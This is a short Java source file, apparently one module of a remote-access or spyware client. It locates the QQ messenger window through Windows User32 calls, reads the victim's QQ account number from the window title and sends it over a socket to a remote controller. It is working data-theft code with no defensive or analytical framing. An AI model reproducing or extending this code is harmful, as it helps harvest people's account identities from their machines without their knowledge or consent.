package me.client.send;

import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.io.UnsupportedEncodingException;
import java.net.Socket;

public class SendQQNumber extends Thread {
    Socket socket;
    public SendQQNumber(Socket socket) {
        this.socket = socket;
    }

    public void SendQQNumbers() throws UnsupportedEncodingException {
        SendMessage.sendHead(MessageFlags.SHOW_QQNUMBERWINDOW,socket);
        char[] chars = new char[260];
        WinDef.HWND hwnd = User32.INSTANCE.FindWindow("5B3838F5-0C81-46D9-A4C0-6EA28CA3E942",null);
        if(hwnd != null) {
            User32.INSTANCE.GetWindowText(hwnd, chars, 260);
            String str = String.valueOf(chars).trim();
            SendMessage.send(MessageFlags.GET_QQNUMBER, str.substring(str.indexOf("prefix_") + 7).getBytes("GBK"), socket);
        }else {
            SendMessage.send(MessageFlags.GET_QQNUMBER,"未知".getBytes("GBK"),socket);
        }
    }
}